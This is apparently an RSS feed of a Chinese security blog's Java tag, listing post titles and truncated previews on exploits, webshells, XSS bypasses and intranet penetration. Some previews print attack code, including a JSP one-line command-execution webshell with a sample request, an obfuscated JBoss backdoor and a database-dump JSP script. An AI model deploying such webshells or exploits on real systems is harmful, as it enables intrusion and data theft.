<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Java on Nuclear&#39;Atk（核攻击）网络安全实验室</title>
    <link>https://lcx.cc/tags/java/</link>
    <description>Recent content in Java on Nuclear&#39;Atk（核攻击）网络安全实验室</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <copyright>Nuclear&#39;Atk（核攻击）网络安全实验室</copyright>
    <lastBuildDate>Mon, 31 Aug 2015 15:42:37 +0800</lastBuildDate><atom:link href="https://lcx.cc/tags/java/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS</title>
      <link>https://lcx.cc/post/4564/</link>
      <pubDate>Mon, 31 Aug 2015 15:42:37 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4564/</guid>
      <description>利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS 小饼仔 | 2015-08-20 14:52 看了篇文章 Using Appcache and ServiceWorker for Evil，讲的是黑下服务器后，通过 Middlekit 技术，污染每个访问者的浏览器ca</description>
    </item>
    
    <item>
      <title>Struts2命令执行POC增强版</title>
      <link>https://lcx.cc/post/4559/</link>
      <pubDate>Mon, 10 Aug 2015 15:19:07 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4559/</guid>
      <description>Struts2命令执行POC增强版 Wulala (^..^ ^..^ ^↓^ ^..^ ^..^) | 2015-08-04 13:06 Struts2命令执行的漏洞大家比我都了解, 网上公开的也有很多利用的POC. 带回显命</description>
    </item>
    
    <item>
      <title>Bypassing Chrome’s Anti-XSS Filter，绕过谷歌浏览器 XSS 过滤器</title>
      <link>https://lcx.cc/post/4546/</link>
      <pubDate>Thu, 25 Jun 2015 16:45:17 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4546/</guid>
      <description>Hi! Just wanted to share my finding. I’ve found a way to bypass Chrome’s anti-xss filter. This bypass is universal, and it defeats Chrome’s XSSAuditor in all cases! Description XSS attacks occur when one website injects JavaScript code into otherwise legitimate requests to another website. The injected script generally attempts to access privileged</description>
    </item>
    
    <item>
      <title>TCP会话劫持的应对，如何避免HTTP被骨干线路劫持？</title>
      <link>https://lcx.cc/post/4534/</link>
      <pubDate>Fri, 15 May 2015 09:43:56 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4534/</guid>
      <description>TCP会话劫持的应对 336 | 2015-05-14 13:50 不知道放在这个区里对不对，因为后面要用到javascript来解决问题，所以发在这里，如有不妥请告知。 事情起因：</description>
    </item>
    
    <item>
      <title>一条短信控制你的手机！Android平台的SQL注入漏洞浅析</title>
      <link>https://lcx.cc/post/4518/</link>
      <pubDate>Mon, 13 Apr 2015 12:50:49 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4518/</guid>
      <description>博文作者：Gmxp 发布日期：2015-03-23 博文内容： 0x0前言 14年11月笔者在百度xteam博客中看到其公开了此前报告给Google</description>
    </item>
    
    <item>
      <title>python富文本XSS过滤器开发与研究</title>
      <link>https://lcx.cc/post/4516/</link>
      <pubDate>Thu, 09 Apr 2015 09:23:17 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4516/</guid>
      <description>python富文本XSS过滤器 phith0n (我也不会难过 你不要小看我) | 2015-04-08 22:23 前言：那天我正在开发网站最关键的部分——XSS过滤器，女神突然来电话说：“</description>
    </item>
    
    <item>
      <title>JBoss JMXInvokerServlet JMXInvoker 0.3 - Remote Command Execution</title>
      <link>https://lcx.cc/post/4512/</link>
      <pubDate>Tue, 31 Mar 2015 14:31:28 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4512/</guid>
      <description>JBoss JMXInvokerServlet JMXInvoker 0.3 - 远程代码执行 /* * JBoss JMXInvokerServlet Remote Command Execution * JMXInvoker.java v0.3 - Luca Carettoni @_ikki * * This code exploits a common misconfiguration in JBoss Application Server (4.x, 5.x, ...). * Whenever the JMX Invoker is exposed with the default configuration, a malicious &#34;MarshalledInvocation&#34; * serialized Java object allows to execute arbitrary code. This exploit works even if the &#34;Web-Console&#34;</description>
    </item>
    
    <item>
      <title>ElasticSearch Groovy 脚本远程代码执行漏洞分析(CVE-2015-1427)</title>
      <link>https://lcx.cc/post/4500/</link>
      <pubDate>Wed, 04 Mar 2015 14:35:20 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4500/</guid>
      <description>作者：Lupin @ 京东安全应急响应中心 日期：2015-3-3 ElasticSearch是一个JAVA开发的搜索分析引擎。2014年，曾经被曝</description>
    </item>
    
    <item>
      <title>批量删除QQ微博之简易Java版</title>
      <link>https://lcx.cc/post/4496/</link>
      <pubDate>Tue, 10 Feb 2015 15:59:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4496/</guid>
      <description>批量删除QQ微博之简易Java版 浮萍 | 2015-02-06 16:59 写了半天，发表的时候竟然出错了，然后不得不重新写一次。。。。 PS：以后发表前要先备份呀。 先上代码吧</description>
    </item>
    
    <item>
      <title>JS破解乌云验证码，JavaScript 验证码识别，js验证码识别</title>
      <link>https://lcx.cc/post/4488/</link>
      <pubDate>Tue, 27 Jan 2015 13:19:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4488/</guid>
      <description>JS破解乌云验证码 p.z (谈钞票伤感情 谈感情又伤钞票又伤感情) | 2015-01-17 15:35 以后盲打乌云后台有验证码也不怕啦 (function(){ function decaptcha(image){ var canvas = document.createElement(&#34;canvas&#34;).getContext(&#39;2d&#39;); var result = &#39;&#39;; var letter = [[],[],[],[]]; var letterArea = { &#39;0&#39;: {&#39;x1&#39;:14, &#39;x2&#39;:21,</description>
    </item>
    
    <item>
      <title>Jsp 小后门，Jsp 一句话木马后门详解</title>
      <link>https://lcx.cc/post/4467/</link>
      <pubDate>Sun, 21 Dec 2014 12:43:27 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4467/</guid>
      <description>一：执行系统命令: 无回显执行系统命令： &amp;lt;%Runtime.getRuntime().exec(request.getParameter(&#34;i&#34;));%&amp;gt; 请求：http://192.168.16.240:8080/Shell/cmd2.jsp?i=ls 执</description>
    </item>
    
    <item>
      <title>Android &lt;5.0 ObjectInputStream 权限提升漏洞，安卓5.0以下版本提权漏洞</title>
      <link>https://lcx.cc/post/4450/</link>
      <pubDate>Sun, 23 Nov 2014 17:07:42 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4450/</guid>
      <description>android 5.0 修复了此漏洞：https://android.googlesource.com/platform/libcore/+/738c833d3</description>
    </item>
    
    <item>
      <title>Fuzz中的javascript大小写特性</title>
      <link>https://lcx.cc/post/4433/</link>
      <pubDate>Fri, 26 Sep 2014 12:11:20 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4433/</guid>
      <description>Fuzz中的javascript大小写特性 phith0n (我也不会难过 你不要小看我) | 2014-09-25 00:17 @瞌睡龍 说发过来，我就发到zone里给大家一起分享吧~ toUp</description>
    </item>
    
    <item>
      <title>一些有趣的 XSS Vector</title>
      <link>https://lcx.cc/post/4427/</link>
      <pubDate>Thu, 11 Sep 2014 09:53:11 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4427/</guid>
      <description>XSS Vector #1 &amp;lt;script src=https://lcx.cc/?20.rs&amp;gt;&amp;lt;/script&amp;gt; URL中第二个斜杠在Internet Explorer下（测试于IE11）可被U+3031,U+3033,U+3035,U+309D</description>
    </item>
    
    <item>
      <title>java 实现 Discuz UC_KEY GetShell</title>
      <link>https://lcx.cc/post/4387/</link>
      <pubDate>Sat, 05 Jul 2014 09:57:06 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4387/</guid>
      <description>Discuz自身提供了一个函数_authcode，实现了自身的Encode和Decode。这里写了一段代码，基本翻译了Discuz的Enco</description>
    </item>
    
    <item>
      <title>如何调用一个远程 js callback 并让浏览器不发送 referer？json hijack</title>
      <link>https://lcx.cc/post/4371/</link>
      <pubDate>Wed, 18 Jun 2014 08:59:57 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4371/</guid>
      <description>如何调用一个远程 js callback 并让浏览器不发送 referer? 核攻击 (统治全球，奴役全人类！毁灭任何胆敢阻拦的有机生物！) | 2014-06-17 17:36 rt? 调用远程js或callback时浏</description>
    </item>
    
    <item>
      <title>JavaScript 获取客户端计算机硬件及系统信息</title>
      <link>https://lcx.cc/post/4366/</link>
      <pubDate>Mon, 09 Jun 2014 14:07:01 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4366/</guid>
      <description>JavaScript 获取客户端计算机硬件及系统信息 通过WMI来实现获取客户端计算机硬件及系统信息: //系统信息获取 function getSysInfo(){ var locator = new ActiveXObject (&#34;WbemScripting.SWbemLocator&#34;); var service = locator.ConnectServer(&#34;.&#34;); //CPU信息 var cpu =</description>
    </item>
    
    <item>
      <title>关于 linux shell 内网如何做代理</title>
      <link>https://lcx.cc/post/4353/</link>
      <pubDate>Sat, 31 May 2014 10:30:40 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4353/</guid>
      <description>关于linux shell 内网如何做代理 疯子 (世人笑我太疯癫，我笑世人看不穿。) | 2014-05-30 20:24 最近渗透一个网站 拿到一个shell root权限 已提权 现在想渗透内</description>
    </item>
    
    <item>
      <title>acat.jar 迷你 WebServer 自带菜刀 java 版</title>
      <link>https://lcx.cc/post/4345/</link>
      <pubDate>Tue, 27 May 2014 10:16:45 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4345/</guid>
      <description>下载： ACat-jdk1.5.jar、ACat-附数据库驱动-jdk1.5.jar ACat.jar、ACat-附数据库驱动.jar 源码：AC</description>
    </item>
    
    <item>
      <title>Elasticsearch 代码执行漏洞利用工具</title>
      <link>https://lcx.cc/post/4339/</link>
      <pubDate>Fri, 23 May 2014 10:24:54 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4339/</guid>
      <description>Elasticsearch 代码执行漏洞利用工具 园长 (乱码你好，乱码再见。) | 2014-05-22 21:12 Elasticsearch_fat.jar，备用地址：http://pan.baid</description>
    </item>
    
    <item>
      <title>jsp wget 脱裤脚本，拖数据库脚本</title>
      <link>https://lcx.cc/post/4336/</link>
      <pubDate>Wed, 21 May 2014 10:36:16 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4336/</guid>
      <description>jsp wget脱裤脚本 Gavin | 2014-05-20 17:27 刚刚和朋友看了下jsp也可以实现 &amp;lt;%@ page contentType=&#34;text/html; charset=utf-8&#34; %&amp;gt; &amp;lt;%@ page language=&#34;java&#34; %&amp;gt; &amp;lt;%@ page import=&#34;java.sql.*&#34; %&amp;gt; &amp;lt;% //author: By Gavin //Usage: wget &#34;http://xxx.com/wget_db.jsp?sn=0&amp;amp;en=5000000&amp;amp;ln=50000&#34; -O gavin.sql out.clear(); //分段每次limit查询出来的条数</description>
    </item>
    
    <item>
      <title>XSS Filter Evasion Cheat Sheet 中文版</title>
      <link>https://lcx.cc/post/4328/</link>
      <pubDate>Sat, 17 May 2014 09:28:17 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4328/</guid>
      <description>前言 译者注： 翻译本文的最初原因是当我自己看到这篇文章后，觉得它是非常有价值。但是这么著名的一个备忘录却一直没有人把它翻译成中文版。很多人仅仅</description>
    </item>
    
    <item>
      <title>采集指定域名邮箱用于社工或者fuzz的PHP小脚本</title>
      <link>https://lcx.cc/post/4309/</link>
      <pubDate>Mon, 05 May 2014 09:32:58 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4309/</guid>
      <description>只写了百度的规则,GOOGLE抓取搜索地址后自己写。我的思路是禁止javascript来得到返回的内容。 配合生成弱口令的小脚本进行爆破效果应</description>
    </item>
    
    <item>
      <title>识别wooyun的验证码，wooyun验证码识别，识别乌云验证码的详细分析</title>
      <link>https://lcx.cc/post/4288/</link>
      <pubDate>Tue, 22 Apr 2014 09:23:56 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4288/</guid>
      <description>这两天想学一下验证码的识别，那就拿简单的入手吧，也不舍近求远了，就拿大乌云的验证码试试吧。 乌云的验证码很规则简单，以前也有人做过实验，基本图</description>
    </item>
    
    <item>
      <title>header的安全配置指南</title>
      <link>https://lcx.cc/post/4246/</link>
      <pubDate>Mon, 17 Mar 2014 11:27:25 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4246/</guid>
      <description>from:https://blog.veracode.com/2014/03/guidelines-for-setting-security-headers/ 0x00 背景 在统计了Alexa top 100万网站的header安全分析之后（2012年11月 - 2013年3月 - 2013年11月），我们发现其实如何正</description>
    </item>
    
    <item>
      <title>Jboss JMX/EJBInvokerServlet、HtmlAdaptor漏洞利用工具</title>
      <link>https://lcx.cc/post/4236/</link>
      <pubDate>Thu, 06 Mar 2014 10:58:21 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4236/</guid>
      <description>昨天花了一点时间去看以前的Jboss漏洞，选了俩比较实用的写了个小工具。 第一个漏洞主要是写去年十月份的那个deploy有点小问题：Apach</description>
    </item>
    
    <item>
      <title>用SVG来找点乐子，Svg Fun Time Firefox Svg Vector</title>
      <link>https://lcx.cc/post/4206/</link>
      <pubDate>Thu, 13 Feb 2014 10:25:54 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4206/</guid>
      <description>感觉挺好玩的就翻译了一下 求轻拍 &amp;gt;.&amp;lt; 原文链接：http://insert-script.blogspot.co.at/2014/02/svg-f</description>
    </item>
    
    <item>
      <title>&#34;一句话&#34;的艺术——简单的编码和变形绕过检测</title>
      <link>https://lcx.cc/post/4173/</link>
      <pubDate>Wed, 15 Jan 2014 11:13:26 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4173/</guid>
      <description>0x00 背景 话说现在针对Web端文件代码检测的服务器安全类软件已经非常普及了，常见的有阿D保护盾、安全狗、护卫神、360网站卫士。它们所拥有的功能</description>
    </item>
    
    <item>
      <title>Bypass xss过滤的测试方法</title>
      <link>https://lcx.cc/post/4172/</link>
      <pubDate>Wed, 15 Jan 2014 10:45:38 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4172/</guid>
      <description>0x00 背景 本文来自于《Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters》其中的bypass xss过滤的部分，前面有根据WAF特征确定是哪个WAF的测试方</description>
    </item>
    
    <item>
      <title>身为码农，为12306说两句公道话，前淘宝工程师发帖谈12306：几乎是奇迹！</title>
      <link>https://lcx.cc/post/4165/</link>
      <pubDate>Sat, 11 Jan 2014 23:50:12 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4165/</guid>
      <description>官方订票网站12306崩溃时的页面（资料图） 1月11日起，12306网站开始销售除夕当日火车票。每到此时，铁路系统唯一的官方购票网站1230</description>
    </item>
    
    <item>
      <title>Java WebServer 自动部署后门附工具和源码</title>
      <link>https://lcx.cc/post/4156/</link>
      <pubDate>Wed, 08 Jan 2014 14:52:54 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4156/</guid>
      <description>Java WebServer 自动部署后门附工具和源码 园长 (你在身边就是缘，缘分写在数据库里面。) | 2014-01-07 19:33 社区发现有人发了一个Jboss的自动部署war的后门：求此后门</description>
    </item>
    
    <item>
      <title>求此后门的利用方法，一段另类的 java 后门代码，Jboss 自动部署 war 后门</title>
      <link>https://lcx.cc/post/4155/</link>
      <pubDate>Wed, 08 Jan 2014 14:49:10 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4155/</guid>
      <description>日一个jboss的 站。 洞被补掉了， 但是看到 有人已经传了后门上去 详细代码 如下 &amp;lt;% @page import=&#34;java.io.*, java.util.*, sun.misc.BASE64Decoder&#34; %&amp;gt; &amp;lt;% String PJdpj = &#34;&#34;; String pIGx = &#34;&#34;; String RSVw = System.getProperty(&#34;jboss.server.home.dir&#34;); if (request.getParameter(&#34;pUBYyDsT&#34;) != null){ try { PJdpj = request.getParameter(&#34;pUBYyDsT&#34;); pIGx = request.getParameter(&#34;oAEICWIo&#34;); byte[] rFPE</description>
    </item>
    
    <item>
      <title>我是这么设计高性能海量数(ku)据(zi)查询系统的（一）</title>
      <link>https://lcx.cc/post/4129/</link>
      <pubDate>Wed, 01 Jan 2014 10:55:53 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4129/</guid>
      <description>码完文章一看，都2014年了，在这里先祝大家新年快乐！O(∩_∩)O~~ 看了@Ph4nt0m 菊苣写了一篇类似的文章，刚好我最近也在做这种事情</description>
    </item>
    
    <item>
      <title>Java数据源”Hack”</title>
      <link>https://lcx.cc/post/4123/</link>
      <pubDate>Mon, 30 Dec 2013 22:44:56 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4123/</guid>
      <description>哦，My God..ApplicationContext.xml找不到明文的数据库连接账号密码！快崩溃了，看过攻击JavaWeb应用[1]-J</description>
    </item>
    
    <item>
      <title>如何用各种编程语言杀死一条龙</title>
      <link>https://lcx.cc/post/4119/</link>
      <pubDate>Sat, 28 Dec 2013 20:38:45 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4119/</guid>
      <description>这篇有趣的文章编译自一篇西班牙博客。 有一位美丽的公主，被关押在一个城堡中最高的塔上，一条凶恶的巨龙看守着她，需要有一位勇士营救她… 下面是各种</description>
    </item>
    
    <item>
      <title>关于JBOSS解密数据库连接池的问题汇总小白贴</title>
      <link>https://lcx.cc/post/4118/</link>
      <pubDate>Sat, 28 Dec 2013 10:32:59 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4118/</guid>
      <description>用了JDgui还有看了前辈门的解密方法我一个没成功过。 jboss下是可以对数据源密码进行加密的，相关的文章很多，我这里要讲的是如何破解。 jb</description>
    </item>
    
    <item>
      <title>“内网漫游”-web</title>
      <link>https://lcx.cc/post/4099/</link>
      <pubDate>Wed, 18 Dec 2013 10:42:54 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4099/</guid>
      <description>经常在wooyun看到“漫游内网”之类的漏洞，那么这样的漏洞一般是怎么产生的呢？ Demo1：未经校验的url重定向 import java.io.IOException; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class wooyun</description>
    </item>
    
    <item>
      <title>Hibernate对注入的简单测试</title>
      <link>https://lcx.cc/post/4093/</link>
      <pubDate>Tue, 17 Dec 2013 10:55:41 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4093/</guid>
      <description>0x00 背景 前段时间遇到一个使用了Hibernate框架的站，以前没怎么接触过（由于是Java盲，所以大家勿喷），再注入的事情发生了许多奇奇怪怪的</description>
    </item>
    
    <item>
      <title>Java爆破SVN、FTP、任何数据库、SMTP、SSH、LDAP。。。</title>
      <link>https://lcx.cc/post/4076/</link>
      <pubDate>Sat, 07 Dec 2013 15:48:23 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4076/</guid>
      <description>Java爆破SVN、FTP、任何数据库、SMTP、SSH、LDAP。。。 园长 (你在身边就是缘，缘分写在数据库里面。) | 2013-12-07 15:31 Java有很多开源</description>
    </item>
    
    <item>
      <title>Real-World CSRF attack hijacks DNS Server configuration of TP-Link routers</title>
      <link>https://lcx.cc/post/4037/</link>
      <pubDate>Sat, 23 Nov 2013 14:00:39 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4037/</guid>
      <description>Introduction Analysis of the exploit Analysis of the CSRF payload Consequences of a malicious DNS server Prevalence of the exploit Recommendations to mitigate the problem Affected Devices References Introduction Today the majority of wired Internet connections is used with an embedded NAT router, which allows using the same Internet connection with several devices in parallel and also provides some protection against incoming attacks from the Internet. Most of these routers</description>
    </item>
    
    <item>
      <title>针对TP-LINK的CSRF攻击来劫持DNS案例</title>
      <link>https://lcx.cc/post/4036/</link>
      <pubDate>Sat, 23 Nov 2013 13:54:23 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4036/</guid>
      <description>0x00 背景 路由被CSRF攻击，修改DNS的话题最近一直比较活跃，但是国内貌似没有一个技术文章详细的分析此漏洞，漏洞成因比较简单，本篇来科普一下。</description>
    </item>
    
    <item>
      <title>跨过边界防火墙，我拿菜刀砍内网</title>
      <link>https://lcx.cc/post/4016/</link>
      <pubDate>Tue, 19 Nov 2013 14:48:35 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4016/</guid>
      <description>内网环境一般比较复杂，有时候针对内网的渗透会使用各种各样的方法、手段； 我所遇到的内网环境有以下几种(其它的大牛们来补充哈)： 情况一：内、外网</description>
    </item>
    
    <item>
      <title>批量抓取QQ空间5-8年前“消失了的QQ心情”</title>
      <link>https://lcx.cc/post/3985/</link>
      <pubDate>Mon, 04 Nov 2013 14:19:06 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3985/</guid>
      <description>用企鹅比较早的同学都知道早在05年到08年左右企鹅有个功能叫“QQ心情”后来改名叫“滔滔”。现在改名叫“说说”。 自从某一版本更新后以前的“Q</description>
    </item>
    
    <item>
      <title>网站密码被星号加密了？教你怎么解。</title>
      <link>https://lcx.cc/post/3978/</link>
      <pubDate>Mon, 04 Nov 2013 09:59:22 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3978/</guid>
      <description>网站密码被星号加密了？教你怎么解。 Black-Hole | 2013-11-02 16:35 这也是只是我在学javascript时，突然想到的，今天试验了下，果然成功了。 这是个测试的：这个事</description>
    </item>
    
    <item>
      <title>JavaWeb随机后门?</title>
      <link>https://lcx.cc/post/3969/</link>
      <pubDate>Mon, 28 Oct 2013 11:33:34 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3969/</guid>
      <description>我的思路是先从远程读取要生成的shell内容，然后把shell藏在WEB-INF下shell的名字和长度也都随机生成。比如： 不过就算藏在WE</description>
    </item>
    
    <item>
      <title>XSS与字符编码的那些事儿 ---科普文</title>
      <link>https://lcx.cc/post/3964/</link>
      <pubDate>Wed, 23 Oct 2013 10:27:53 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3964/</guid>
      <description>目录 0x00:基本介绍 0x01:html实体编码 0x02:新增的实体编码 实体编码变异以及浏览器的某些工作原理！ 0x03:javascript</description>
    </item>
    
    <item>
      <title>两种“新型”的javaweb后门(jspx和Java Logger)</title>
      <link>https://lcx.cc/post/3939/</link>
      <pubDate>Fri, 11 Oct 2013 08:55:38 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3939/</guid>
      <description>关于JavaWeb后门问题一直以来都比较少，而比较新奇的后门更少。在这里我分享两个我最近搞的比较有意思的JavaWeb后门给大家玩。一个常见</description>
    </item>
    
    <item>
      <title>一段通过WebRTC获取客户端内网IP的js （无需java/ActiveX支持）</title>
      <link>https://lcx.cc/post/3938/</link>
      <pubDate>Fri, 11 Oct 2013 08:47:57 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3938/</guid>
      <description>已在chrome firefox下测试 &amp;lt;script&amp;gt; // NOTE: window.RTCPeerConnection is &#34;not a constructor&#34; in FF22/23 var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection; if (RTCPeerConnection) (function () { var rtc = new RTCPeerConnection({iceServers:[]}); if (window.mozRTCPeerConnection) { // FF needs a channel/stream to proceed rtc.createDataChannel(&#39;&#39;, {reliable:false}); }; rtc.onicecandidate = function (evt) { if (evt.candidate) grepSDP(evt.candidate.candidate); }; rtc.createOffer(function (offerDesc)</description>
    </item>
    
    <item>
      <title>得到内网域管理员的5种常见方法</title>
      <link>https://lcx.cc/post/3926/</link>
      <pubDate>Sat, 05 Oct 2013 14:59:03 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3926/</guid>
      <description>from:http://blog.spiderlabs.com/2013/09/top-five-ways-spiderlabs-got-domain-admin-on-your-internal-network.html spiderlabs总结的,我简单翻译下,偶尔加点我的牢骚。 1.Netbios and LLMNR Name Poisoning 这个方法在WIN工作组下渗透很有用,WIN的请求查询顺序是下面三个步</description>
    </item>
    
    <item>
      <title>Java lookupByteBI 堆缓冲区溢出POC</title>
      <link>https://lcx.cc/post/3888/</link>
      <pubDate>Wed, 18 Sep 2013 09:14:04 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3888/</guid>
      <description>在Win7 jdk1.7.0_07下测试通过。 CVE: CVE-2013-2470。 Java lookupByteBI function heap buffer overflow poc.zip 影响版本： JRE 7 update 21 JRE 6 update 45 [原文地址]</description>
    </item>
    
  </channel>
</rss>
